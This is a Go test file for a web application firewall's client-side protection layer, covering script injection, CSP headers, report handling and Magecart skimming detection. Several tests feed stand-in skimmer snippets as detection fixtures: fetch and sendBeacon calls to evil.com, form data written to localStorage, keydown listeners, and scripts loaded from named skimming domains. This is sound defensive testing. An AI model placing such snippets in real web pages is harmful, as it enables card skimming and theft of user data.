package clientside

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// ---------------------------------------------------------------------------
// Script injection (agent injection) — comprehensive
// ---------------------------------------------------------------------------

func TestInjectAgent_HeadPosition(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "head"
	cfg.AgentInjection.MonitorDOM = true
	cfg.AgentInjection.MonitorNetwork = false
	cfg.AgentInjection.MonitorForms = false
	layer := NewLayer(cfg)

	body := []byte(`<html><head><title>Test</title></head><body>Hello</body></html>`)
	result := layer.InjectAgent(body)

	resultStr := string(result)
	if !strings.Contains(resultStr, `data-guardian="security-agent"`) {
		t.Error("expected agent script to be injected")
	}
	if !strings.Contains(resultStr, "MutationObserver") {
		t.Error("expected DOM monitoring code")
	}

	// Verify injection before </head>
	headCloseIdx := strings.Index(resultStr, "</head>")
	agentIdx := strings.Index(resultStr, "security-agent")
	if agentIdx >= headCloseIdx {
		t.Error("agent should be injected before </head>")
	}
}

func TestInjectAgent_BodyEndPosition(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "body-end"
	cfg.AgentInjection.MonitorDOM = false
	cfg.AgentInjection.MonitorNetwork = true
	cfg.AgentInjection.MonitorForms = false
	layer := NewLayer(cfg)

	body := []byte(`<html><head></head><body><p>Content</p></body></html>`)
	result := layer.InjectAgent(body)

	resultStr := string(result)
	if !strings.Contains(resultStr, "security-agent") {
		t.Error("expected agent script")
	}
	if !strings.Contains(resultStr, "originalFetch") {
		t.Error("expected network monitoring code")
	}

	bodyCloseIdx := strings.Index(resultStr, "</body>")
	agentIdx := strings.Index(resultStr, "security-agent")
	if agentIdx >= bodyCloseIdx {
		t.Error("agent should be injected before </body>")
	}
}

func TestInjectAgent_DefaultPosition(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "" // default = head-start
	cfg.AgentInjection.MonitorDOM = false
	cfg.AgentInjection.MonitorNetwork = false
	cfg.AgentInjection.MonitorForms = true
	layer := NewLayer(cfg)

	body := []byte(`<html><head><title>T</title></head><body><form action="/login"></form></body></html>`)
	result := layer.InjectAgent(body)

	resultStr := string(result)
	if !strings.Contains(resultStr, "security-agent") {
		t.Error("expected agent script")
	}
	if !strings.Contains(resultStr, "form_submit") {
		t.Error("expected form monitoring code")
	}
}

func TestInjectAgent_NoHeadOrBody(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "head"
	layer := NewLayer(cfg)

	// No <head> or </head> tags — should prepend
	body := []byte(`<div>Hello World</div>`)
	result := layer.InjectAgent(body)

	if len(result) <= len(body) {
		t.Error("body should be larger after injection")
	}
	if !strings.HasPrefix(string(result), "<script") {
		t.Error("expected script to be prepended")
	}
}

func TestInjectAgent_Disabled(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = false
	layer := NewLayer(cfg)

	body := []byte(`<html><head></head><body>Hi</body></html>`)
	result := layer.InjectAgent(body)

	if string(result) != string(body) {
		t.Error("body should be unchanged when injection is disabled")
	}
}

func TestGenerateAgentScript_AllMonitors(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.MonitorDOM = true
	cfg.AgentInjection.MonitorNetwork = true
	cfg.AgentInjection.MonitorForms = true
	layer := NewLayer(cfg)

	script := layer.generateAgentScript()

	if !strings.Contains(script, "MutationObserver") {
		t.Error("expected DOM monitoring")
	}
	if !strings.Contains(script, "originalFetch") {
		t.Error("expected network monitoring")
	}
	if !strings.Contains(script, "form_submit") {
		t.Error("expected form monitoring")
	}
	if !strings.Contains(script, "gwafReport") {
		t.Error("expected report function")
	}
}

func TestGenerateAgentScript_NoMonitors(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.MonitorDOM = false
	cfg.AgentInjection.MonitorNetwork = false
	cfg.AgentInjection.MonitorForms = false
	layer := NewLayer(cfg)

	script := layer.generateAgentScript()

	if strings.Contains(script, "MutationObserver") {
		t.Error("should not contain DOM monitoring")
	}
	if strings.Contains(script, "originalFetch") {
		t.Error("should not contain network monitoring")
	}
	if strings.Contains(script, "form_submit") {
		t.Error("should not contain form monitoring")
	}
	// Should still have the core script wrapper
	if !strings.Contains(script, "gwafReport") {
		t.Error("expected core report function")
	}
}

func TestGenerateAgentScript_Disabled(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.Enabled = false
	layer := NewLayer(cfg)

	script := layer.generateAgentScript()
	if script != "" {
		t.Errorf("expected empty script when disabled, got %q", script)
	}
}

// ---------------------------------------------------------------------------
// CSP header management
// ---------------------------------------------------------------------------

func TestGetCSPHeader_Disabled(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CSP.Enabled = false
	layer := NewLayer(cfg)

	name, value := layer.GetCSPHeader()
	if name != "" || value != "" {
		t.Errorf("expected empty CSP header when disabled, got %q: %q", name, value)
	}
}

func TestGetCSPHeader_FullDirectives(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = false
	cfg.CSP.DefaultSrc = []string{"'self'"}
	cfg.CSP.ScriptSrc = []string{"'self'", "https://cdn.example.com"}
	cfg.CSP.StyleSrc = []string{"'self'", "'unsafe-inline'"}
	cfg.CSP.ImgSrc = []string{"'self'", "data:", "https:"}
	cfg.CSP.ConnectSrc = []string{"'self'", "https://api.example.com"}
	cfg.CSP.FontSrc = []string{"'self'", "https://fonts.example.com"}
	cfg.CSP.ObjectSrc = []string{"'none'"}
	cfg.CSP.MediaSrc = []string{"'self'"}
	cfg.CSP.FrameSrc = []string{"'self'"}
	cfg.CSP.FrameAncestors = []string{"'none'"}
	cfg.CSP.FormAction = []string{"'self'"}
	cfg.CSP.BaseURI = []string{"'self'"}
	cfg.CSP.ReportURI = "/csp-report"
	cfg.CSP.UpgradeInsecure = true

	layer := NewLayer(cfg)
	name, value := layer.GetCSPHeader()

	if name != "Content-Security-Policy" {
		t.Errorf("header name = %q, want Content-Security-Policy", name)
	}

	expectedDirectives := []string{
		"default-src 'self'",
		"script-src 'self' https://cdn.example.com",
		"style-src 'self' 'unsafe-inline'",
		"img-src 'self' data: https:",
		"connect-src 'self' https://api.example.com",
		"font-src 'self' https://fonts.example.com",
		"object-src 'none'",
		"media-src 'self'",
		"frame-src 'self'",
		"frame-ancestors 'none'",
		"form-action 'self'",
		"base-uri 'self'",
		"report-uri /csp-report",
		"upgrade-insecure-requests",
	}

	for _, directive := range expectedDirectives {
		if !containsString(value, directive) {
			t.Errorf("CSP missing directive: %q, got: %q", directive, value)
		}
	}
}

func TestGetCSPHeader_ReportOnlyMode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = true
	cfg.CSP.DefaultSrc = []string{"'self'"}

	layer := NewLayer(cfg)
	name, _ := layer.GetCSPHeader()

	if name != "Content-Security-Policy-Report-Only" {
		t.Errorf("header name = %q, want Content-Security-Policy-Report-Only", name)
	}
}

func TestGetCSPHeader_EmptyDirectives(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = false
	cfg.CSP.DefaultSrc = nil
	cfg.CSP.ScriptSrc = nil
	cfg.CSP.StyleSrc = nil
	cfg.CSP.ImgSrc = nil
	cfg.CSP.ConnectSrc = nil
	cfg.CSP.FontSrc = nil
	cfg.CSP.ObjectSrc = nil
	cfg.CSP.MediaSrc = nil
	cfg.CSP.FrameSrc = nil
	cfg.CSP.FrameAncestors = nil
	cfg.CSP.FormAction = nil
	cfg.CSP.BaseURI = nil
	cfg.CSP.ReportURI = ""
	cfg.CSP.UpgradeInsecure = false

	layer := NewLayer(cfg)
	name, value := layer.GetCSPHeader()

	if name != "Content-Security-Policy" {
		t.Errorf("header name = %q, want Content-Security-Policy", name)
	}
	if value != "" {
		t.Errorf("expected empty value with no directives, got %q", value)
	}
}

// ---------------------------------------------------------------------------
// Browser fingerprinting / magecart detection — comprehensive
// ---------------------------------------------------------------------------

func TestAnalyzeResponseBody_EvalDetection(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	layer := NewLayer(cfg)

	body := []byte(`<script>eval("malicious code")</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected eval to be detected")
	}
	found := false
	for _, m := range result.Matches {
		if m.Pattern == "obfuscated_js" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected obfuscated_js pattern match")
	}
}

func TestAnalyzeResponseBody_FromCharCode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	layer := NewLayer(cfg)

	body := []byte(`<script>String.fromCharCode(60,115,99,114,105,112,116,62)</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected fromCharCode to be detected as obfuscation")
	}
}

func TestAnalyzeResponseBody_DocumentWrite(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	layer := NewLayer(cfg)

	body := []byte(`<script>document.write('<img src=evil>')</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected document.write to be detected")
	}
}

func TestAnalyzeResponseBody_HexEncoding(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	layer := NewLayer(cfg)

	body := []byte(`<script>var x = "\x41\x42\x43\x44";</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected hex encoding to be detected as obfuscation")
	}
}

func TestAnalyzeResponseBody_SkimmingPattern(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectSuspiciousDomains = true
	layer := NewLayer(cfg)

	body := []byte(`<script src="https://evil-skimmer.com/pixel.js"></script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected suspicious skimming pattern to be detected")
	}
}

func TestAnalyzeResponseBody_FormExfiltration_Fetch(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectFormExfiltration = true
	layer := NewLayer(cfg)

	body := []byte(`<script>fetch("https://evil.com/steal").then(function(){post})</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected fetch-based form exfiltration to be detected")
	}
}

func TestAnalyzeResponseBody_FormExfiltration_Storage(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectFormExfiltration = true
	layer := NewLayer(cfg)

	body := []byte(`<script>localStorage.setItem('stolen', formData)</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected localStorage.setItem to be detected")
	}
}

func TestAnalyzeResponseBody_CreditCardField(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectSuspiciousDomains = true
	layer := NewLayer(cfg)

	body := []byte(`<script>document.querySelector('#credit_card_number input field form')</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected credit card field access to be detected")
	}
}

func TestAnalyzeResponseBody_KnownSkimmingDomain_Critical(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectSuspiciousDomains = true
	cfg.MagecartDetection.KnownSkimmingDomains = []string{"evil-tracker.com"}
	layer := NewLayer(cfg)

	// URL hostname contains "track" which matches SkimmingPatterns regex,
	// AND contains known skimming domain "evil-tracker.com"
	body := []byte(`<script src="https://evil-tracker.com/skim.js"></script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected known skimming domain to be detected")
	}

	// Should have magecart_attack threat type due to critical severity
	if result.ThreatType != "magecart_attack" {
		t.Errorf("ThreatType = %q, want magecart_attack", result.ThreatType)
	}
}

func TestAnalyzeResponseBody_MultipleThreats(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	cfg.MagecartDetection.DetectKeyloggers = true
	layer := NewLayer(cfg)

	body := []byte(`
		<script>
			eval("code");
			document.addEventListener('keydown', function(e) {});
		</script>
	`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected threats to be detected")
	}
	if len(result.Matches) < 2 {
		t.Errorf("expected at least 2 matches, got %d", len(result.Matches))
	}
	if result.Score <= 0 {
		t.Errorf("expected positive score, got %d", result.Score)
	}
}

func TestAnalyzeResponseBody_ScoreCapped(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	cfg.MagecartDetection.DetectSuspiciousDomains = true
	cfg.MagecartDetection.DetectKeyloggers = true
	cfg.MagecartDetection.DetectFormExfiltration = true
	layer := NewLayer(cfg)

	// Body with many threats
	body := []byte(`
		<script>
			eval(atob("code"));
			unescape("%3Cscript%3E");
			String.fromCharCode(60,115);
			document.write("hello");
			document.addEventListener('keydown', function(){});
			navigator.sendBeacon('https://evil.com', data);
			fetch('https://evil.com', {method:'POST'});
			localStorage.setItem('stolen', data);
		</script>
	`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Error("expected detection")
	}
	if result.Score > 100 {
		t.Errorf("score should be capped at 100, got %d", result.Score)
	}
}

func TestAnalyzeResponseBody_NoPatternsEnabled(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.DetectObfuscatedJS = false
	cfg.MagecartDetection.DetectSuspiciousDomains = false
	cfg.MagecartDetection.DetectKeyloggers = false
	cfg.MagecartDetection.DetectFormExfiltration = false
	layer := NewLayer(cfg)

	body := []byte(`<script>eval("malicious")</script>`)
	result := layer.analyzeResponseBody(body)

	if result.Detected {
		t.Error("with all detection sub-flags off, analyzeResponseBody should not detect anything")
	}
}

func TestAnalyzeResponseBody_EmptyBody(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	layer := NewLayer(cfg)

	result := layer.analyzeResponseBody([]byte{})
	if result.Detected {
		t.Error("empty body should not trigger detection")
	}
}

func TestIsKnownSkimmingDomain(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.KnownSkimmingDomains = []string{"evil.com", "skimmer.net"}
	layer := NewLayer(cfg)

	if !layer.isKnownSkimmingDomain("visit evil.com for more") {
		t.Error("expected match for known domain")
	}
	if !layer.isKnownSkimmingDomain("load from skimmer.net/payload") {
		t.Error("expected match for known domain")
	}
	if layer.isKnownSkimmingDomain("safe-domain.com") {
		t.Error("should not match unknown domain")
	}
}

func TestAddSkimmingDomain(t *testing.T) {
	cfg := DefaultConfig()
	layer := NewLayer(cfg)

	layer.AddSkimmingDomain("newly-added-evil.com")

	if !layer.isKnownSkimmingDomain("newly-added-evil.com/path") {
		t.Error("dynamically added domain should be detected")
	}
}

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

func TestDefaultConfig_Values(t *testing.T) {
	cfg := DefaultConfig()

	if !cfg.Enabled {
		t.Error("expected Enabled = true")
	}
	if cfg.Mode != "monitor" {
		t.Errorf("Mode = %q, want monitor", cfg.Mode)
	}
	if !cfg.MagecartDetection.Enabled {
		t.Error("MagecartDetection should be enabled")
	}
	if cfg.MagecartDetection.BlockScore != 50 {
		t.Errorf("BlockScore = %d, want 50", cfg.MagecartDetection.BlockScore)
	}
	if cfg.AgentInjection.Enabled {
		t.Error("AgentInjection should be disabled by default")
	}
	if cfg.CSP.Enabled {
		t.Error("CSP should be disabled by default")
	}
	if len(cfg.Exclusions) == 0 {
		t.Error("expected default exclusions")
	}
}

func TestCompilePatterns_AllDisabled(t *testing.T) {
	cfg := &MagecartConfig{
		Enabled:                true,
		DetectObfuscatedJS:     false,
		DetectSuspiciousDomains: false,
		DetectKeyloggers:       false,
		DetectFormExfiltration: false,
	}

	patterns := CompilePatterns(cfg)
	if patterns == nil {
		t.Fatal("patterns should not be nil")
	}
	if len(patterns.ObfuscationPatterns) != 0 {
		t.Error("expected no obfuscation patterns when disabled")
	}
	if len(patterns.SkimmingPatterns) != 0 {
		t.Error("expected no skimming patterns when disabled")
	}
	if len(patterns.KeyloggerPatterns) != 0 {
		t.Error("expected no keylogger patterns when disabled")
	}
	if len(patterns.FormExfilPatterns) != 0 {
		t.Error("expected no form exfil patterns when disabled")
	}
}

func TestDefaultSuspiciousPatterns(t *testing.T) {
	patterns := DefaultSuspiciousPatterns()
	if len(patterns) == 0 {
		t.Error("expected default suspicious patterns")
	}
}

// ---------------------------------------------------------------------------
// Process method — layer integration
// ---------------------------------------------------------------------------

func TestLayer_Process_BasicPass(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/page",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("expected pass, got %v", result.Action)
	}
}

func TestLayer_Process_NilConfig(t *testing.T) {
	layer := NewLayer(nil)

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/page",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("expected pass with nil config, got %v", result.Action)
	}
}

func TestLayer_Process_CSPHookRegistered(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.CSP.Enabled = true
	cfg.CSP.ReportOnly = false
	cfg.CSP.DefaultSrc = []string{"'self'"}
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: make(map[string]any),
	}

	result := layer.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("expected pass, got %v", result.Action)
	}

	// Verify CSP metadata
	if ctx.Metadata["csp_header_name"] == nil {
		t.Error("expected csp_header_name in metadata")
	}
	if ctx.Metadata["csp_header_value"] == nil {
		t.Error("expected csp_header_value in metadata")
	}

	// Verify CSP hook is callable
	hook, ok := ctx.Metadata["clientside_csp_hook"]
	if !ok {
		t.Fatal("expected clientside_csp_hook in metadata")
	}
	fn, ok := hook.(func(http.ResponseWriter))
	if !ok {
		t.Fatal("expected CSP hook to be a function")
	}

	// Call the hook with a response writer
	w := httptest.NewRecorder()
	fn(w)

	csp := w.Header().Get("Content-Security-Policy")
	if csp == "" {
		t.Error("expected CSP header to be set by hook")
	}

	// Stats should reflect CSP enforcement
	stats := layer.GetStats()
	if stats.CSPEnforced != 1 {
		t.Errorf("CSPEnforced = %d, want 1", stats.CSPEnforced)
	}
}

func TestLayer_Process_ResponseHook(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.MagecartDetection.Enabled = true
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: make(map[string]any),
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("expected pass, got %v", result.Action)
	}

	hook, ok := ctx.Metadata["clientside_response_hook"]
	if !ok {
		t.Fatal("expected clientside_response_hook in metadata")
	}
	fn, ok := hook.(func([]byte, string) ([]byte, bool))
	if !ok {
		t.Fatal("expected response hook to be a function")
	}

	// Call with clean HTML
	body, modified := fn([]byte("<html><body>Hello</body></html>"), "text/html")
	if modified {
		t.Error("clean HTML should not be modified")
	}
	if string(body) != "<html><body>Hello</body></html>" {
		t.Error("body should be unchanged for clean HTML")
	}
}

func TestLayer_Process_ResponseHookBlockMode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.Mode = "block"
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectObfuscatedJS = true
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: make(map[string]any),
	}

	layer.Process(ctx)

	hook := ctx.Metadata["clientside_response_hook"].(func([]byte, string) ([]byte, bool))
	maliciousBody := []byte(`<script>eval("malicious")</script>`)
	body, _ := hook(maliciousBody, "text/html")

	if strings.Contains(string(body), "eval") {
		t.Error("malicious body should be replaced in block mode")
	}
	if !strings.Contains(string(body), "Blocked by Client-Side Protection") {
		t.Error("expected blocked message")
	}

	stats := layer.GetStats()
	if stats.BlockedRequests != 1 {
		t.Errorf("BlockedRequests = %d, want 1", stats.BlockedRequests)
	}
}

func TestLayer_Process_ResponseHookWithInjection(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AgentInjection.Enabled = true
	cfg.AgentInjection.InjectPosition = "head"
	cfg.MagecartDetection.Enabled = false
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/checkout",
		Metadata: make(map[string]any),
	}

	layer.Process(ctx)

	hook := ctx.Metadata["clientside_response_hook"].(func([]byte, string) ([]byte, bool))
	body := []byte(`<html><head></head><body>Checkout</body></html>`)
	result, modified := hook(body, "text/html")

	if !modified {
		t.Error("body should be modified with agent injection")
	}
	if !strings.Contains(string(result), "security-agent") {
		t.Error("expected agent to be injected")
	}

	stats := layer.GetStats()
	if stats.ScriptsInjected != 1 {
		t.Errorf("ScriptsInjected = %d, want 1", stats.ScriptsInjected)
	}
}

func TestLayer_Process_EmptyBody(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.MagecartDetection.Enabled = true
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: make(map[string]any),
	}

	layer.Process(ctx)

	hook := ctx.Metadata["clientside_response_hook"].(func([]byte, string) ([]byte, bool))
	body, modified := hook([]byte{}, "text/html")
	if modified {
		t.Error("empty body should not be modified")
	}
	if len(body) != 0 {
		t.Error("empty body should remain empty")
	}
}

func TestLayer_Process_ResponseHookNonHTMLContentType(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.MagecartDetection.Enabled = true
	cfg.AgentInjection.Enabled = true
	layer := NewLayer(cfg)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: make(map[string]any),
	}

	layer.Process(ctx)

	hook := ctx.Metadata["clientside_response_hook"].(func([]byte, string) ([]byte, bool))

	// JSON content should not trigger HTML-specific injection
	body := []byte(`{"key": "value"}`)
	result, modified := hook(body, "application/json")
	if modified {
		t.Error("JSON content should not be modified")
	}
	if string(result) != string(body) {
		t.Error("JSON body should be unchanged")
	}
}

func TestLayer_Process_NoMetadataInit(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.CSP.Enabled = true
	layer := NewLayer(cfg)

	// No Metadata set — Process should initialize it
	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: nil,
	}

	layer.Process(ctx)
	if ctx.Metadata == nil {
		t.Error("Process should initialize Metadata")
	}
}

// ---------------------------------------------------------------------------
// Layer lifecycle
// ---------------------------------------------------------------------------

func TestLayer_SetEnabled(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	layer := NewLayer(cfg)

	if !layer.enabled {
		t.Error("layer should start enabled")
	}

	layer.SetEnabled(false)

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/page",
		Metadata: make(map[string]any),
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Error("disabled layer should pass")
	}
	// With enabled=false, no hooks should be registered
	if _, ok := ctx.Metadata["clientside_csp_hook"]; ok {
		t.Error("CSP hook should not be registered when disabled")
	}
}

func TestLayer_Name(t *testing.T) {
	layer := NewLayer(nil)
	if layer.Name() != "clientside" {
		t.Errorf("Name = %q, want clientside", layer.Name())
	}
}

// ---------------------------------------------------------------------------
// shouldInject — path matching
// ---------------------------------------------------------------------------

func TestShouldInject_NestedPaths(t *testing.T) {
	cfg := DefaultConfig()
	cfg.AgentInjection.ProtectedPaths = []string{"/checkout", "/payment"}
	layer := NewLayer(cfg)

	tests := []struct {
		path     string
		expected bool
	}{
		{"/checkout", true},
		{"/checkout/pay", true},
		{"/checkout/pay?step=2", true},
		{"/payment/process", true},
		{"/about", false},
		{"/checkoutpage", true}, // Prefix match
		{"/api/checkout", false},
	}

	for _, tt := range tests {
		if got := layer.shouldInject(tt.path); got != tt.expected {
			t.Errorf("shouldInject(%q) = %v, want %v", tt.path, got, tt.expected)
		}
	}
}

// ---------------------------------------------------------------------------
// ReportHandler — comprehensive
// ---------------------------------------------------------------------------

func TestReportHandler_ClientReport(t *testing.T) {
	handler := NewReportHandler()

	report := ClientReport{
		Type: "script_injected",
		Data: map[string]any{"src": "https://evil.com/skimmer.js"},
		URL:  "https://example.com/checkout",
		TS:   1234567890,
	}

	body, _ := json.Marshal(report)
	req := httptest.NewRequest(http.MethodPost, "/_guardian/report", strings.NewReader(string(body)))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("status = %d, want 204", w.Code)
	}

	reports := handler.Reports()
	if len(reports) != 1 {
		t.Fatalf("expected 1 report, got %d", len(reports))
	}
	if reports[0].Type != "script_injected" {
		t.Errorf("Type = %q, want script_injected", reports[0].Type)
	}
	if reports[0].URL != "https://example.com/checkout" {
		t.Errorf("URL = %q, want https://example.com/checkout", reports[0].URL)
	}
}

func TestReportHandler_MethodNotAllowed(t *testing.T) {
	handler := NewReportHandler()

	req := httptest.NewRequest(http.MethodGet, "/_guardian/report", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("status = %d, want 405", w.Code)
	}
}

func TestReportHandler_InvalidJSON(t *testing.T) {
	handler := NewReportHandler()

	req := httptest.NewRequest(http.MethodPost, "/_guardian/report", strings.NewReader("not json"))
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want 400", w.Code)
	}
}

func TestReportHandler_MaxReportsEviction(t *testing.T) {
	handler := NewReportHandler()

	// Fill up to maxReports
	for i := 0; i < maxReports; i++ {
		report := ClientReport{Type: "test", Data: map[string]any{"i": i}, TS: int64(i)}
		body, _ := json.Marshal(report)
		req := httptest.NewRequest(http.MethodPost, "/_guardian/report", strings.NewReader(string(body)))
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)
	}

	// Add one more — should evict oldest
	report := ClientReport{Type: "overflow", Data: map[string]any{}, TS: 999}
	body, _ := json.Marshal(report)
	req := httptest.NewRequest(http.MethodPost, "/_guardian/report", strings.NewReader(string(body)))
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	reports := handler.Reports()
	if len(reports) != maxReports {
		t.Errorf("expected %d reports, got %d", maxReports, len(reports))
	}
	if reports[0].Type == "test" && reports[0].TS == 0 {
		t.Error("oldest report should have been evicted")
	}
	if reports[len(reports)-1].Type != "overflow" {
		t.Error("newest report should be last")
	}
}

func TestReportHandler_CSPReport(t *testing.T) {
	handler := NewReportHandler()

	cspBody := `{"csp-report":{"document-uri":"https://example.com/page","violated-directive":"script-src 'self'"}}`
	req := httptest.NewRequest(http.MethodPost, "/_guardian/csp-report", strings.NewReader(cspBody))
	req.Header.Set("Referer", "https://example.com/page")
	w := httptest.NewRecorder()

	handler.ServeCSPReport(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("status = %d, want 204", w.Code)
	}

	reports := handler.Reports()
	if len(reports) != 1 {
		t.Fatalf("expected 1 report, got %d", len(reports))
	}
	if reports[0].Type != "csp_violation" {
		t.Errorf("Type = %q, want csp_violation", reports[0].Type)
	}
	if reports[0].URL != "https://example.com/page" {
		t.Errorf("URL = %q, want https://example.com/page", reports[0].URL)
	}
}

func TestReportHandler_CSPReport_MethodNotAllowed(t *testing.T) {
	handler := NewReportHandler()

	req := httptest.NewRequest(http.MethodGet, "/_guardian/csp-report", nil)
	w := httptest.NewRecorder()
	handler.ServeCSPReport(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("status = %d, want 405", w.Code)
	}
}

// ---------------------------------------------------------------------------
// JavaScriptPolicy — config verification
// ---------------------------------------------------------------------------

func TestJavaScriptPolicy_Defaults(t *testing.T) {
	cfg := DefaultConfig()

	if cfg.JavaScriptPolicy.BlockInlineScripts {
		t.Error("BlockInlineScripts should be false by default")
	}
	if cfg.JavaScriptPolicy.BlockEval {
		t.Error("BlockEval should be false by default")
	}
	if cfg.JavaScriptPolicy.BlockNewFunction {
		t.Error("BlockNewFunction should be false by default")
	}
	if cfg.JavaScriptPolicy.BlockWebAssembly {
		t.Error("BlockWebAssembly should be false by default")
	}
}

// ---------------------------------------------------------------------------
// DetectionResult — field validation
// ---------------------------------------------------------------------------

func TestDetectionResult_Fields(t *testing.T) {
	cfg := DefaultConfig()
	cfg.MagecartDetection.Enabled = true
	cfg.MagecartDetection.DetectKeyloggers = true
	layer := NewLayer(cfg)

	body := []byte(`<script>document.addEventListener('keydown', function(e) {});</script>`)
	result := layer.analyzeResponseBody(body)

	if !result.Detected {
		t.Fatal("expected detection")
	}
	if result.Timestamp.IsZero() {
		t.Error("timestamp should be set")
	}
	if len(result.Matches) == 0 {
		t.Error("expected matches")
	}

	match := result.Matches[0]
	if match.Pattern == "" {
